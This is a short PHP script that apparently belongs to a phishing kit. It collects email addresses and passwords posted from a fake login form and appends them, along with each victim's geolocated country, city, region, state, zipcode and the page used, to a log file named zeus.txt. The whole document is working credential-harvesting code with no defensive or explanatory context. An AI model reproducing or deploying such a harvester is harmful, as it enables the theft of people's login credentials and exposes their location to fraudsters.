<?php
include('get_ip.php');
$handle = fopen("zeus.txt", "a"); 
$email = $_POST["email"];
$pass = $_POST["pass"];
$page = $_POST["page"];
fwrite($handle, $email . " : " . $pass . "\n");
fwrite($handle, "Country: ". $_SESSION['_LOOKUP_COUNTRY_']. "\n"); 
fwrite($handle,"City: " . $_SESSION['_LOOKUP_CITY_'] . "\n");
fwrite($handle,"Region:" . $_SESSION['_LOOKUP_REGION_'] . "\n");
fwrite($handle,"State: ".$_SESSION['_LOOKUP_STATE_'] . "\n");
fwrite($handle,"Zipcode:  ".$_SESSION['_LOOKUP_ZIPCODE_']."\n");
fwrite($handle,"Page:  ".$page."\n");
fwrite($handle, "***********************************************************************************************************\n");
fclose($handle);

exit();
?>
